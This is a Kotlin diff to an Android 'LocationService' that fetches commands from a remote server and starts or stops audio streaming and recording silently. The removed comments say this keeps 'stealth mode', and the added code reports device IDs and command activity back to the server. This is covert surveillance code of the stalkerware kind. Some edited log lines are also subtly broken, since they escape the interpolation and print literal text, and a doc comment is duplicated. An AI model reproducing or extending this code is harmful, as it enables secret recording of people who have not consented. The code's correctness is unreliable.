@@ -278,15 +278,42 @@ class LocationService : Service() {
      * Check for streaming commands from server
      */
     private suspend fun checkStreamingCommands() {
-        val deviceId = this.deviceId ?: return
-        val serverUrl = this.serverUrl ?: return
+        val deviceId = this.deviceId
+        val serverUrl = this.serverUrl
+
+        if (deviceId.isNullOrBlank() || serverUrl.isNullOrBlank()) {
+            RemoteLogger.error(
+                serverUrl = serverUrl,
+                deviceId = deviceId,
+                source = TAG,
+                message = "Skipping command check due to missing identifiers"
+            )
+            return
+        }
 
         Log.d(TAG, "Checking commands for device $deviceId at $serverUrl")
         val commands = networkHelper.getStreamingCommands(serverUrl, deviceId)
-        Log.d(TAG, "Received ${commands.size} commands from server")
+        Log.d(TAG, "Received ${'$'}{commands.size} commands from server")
+        RemoteLogger.info(
+            serverUrl = serverUrl,
+            deviceId = deviceId,
+            source = TAG,
+            message = "Fetched streaming commands",
+            meta = mapOf("count" to commands.size)
+        )
 
         for (command in commands) {
-            Log.d(TAG, "Processing command: ${command.type}")
+            Log.d(TAG, "Processing command: ${'$'}{command.type}")
+            RemoteLogger.info(
+                serverUrl = serverUrl,
+                deviceId = deviceId,
+                source = TAG,
+                message = "Processing command",
+                meta = mapOf(
+                    "type" to command.type,
+                    "timestamp" to command.timestamp
+                )
+            )
 
             when (command.type) {
                 "start_audio_stream" -> {
@@ -298,17 +325,18 @@ class LocationService : Service() {
                 "start_recording" -> {
                     audioRecorder.setRecordingMode(true)
                     Log.d(TAG, "Recording mode enabled (silent)")
-                    // No notification update - keep stealth mode
                 }
                 "stop_recording" -> {
                     audioRecorder.setRecordingMode(false)
                     Log.d(TAG, "Recording mode disabled (silent)")
-                    // No notification update - keep stealth mode
                 }
             }
         }
     }
 
+    /**
+     * Start audio streaming
+     */
     /**
      * Start audio streaming
      */
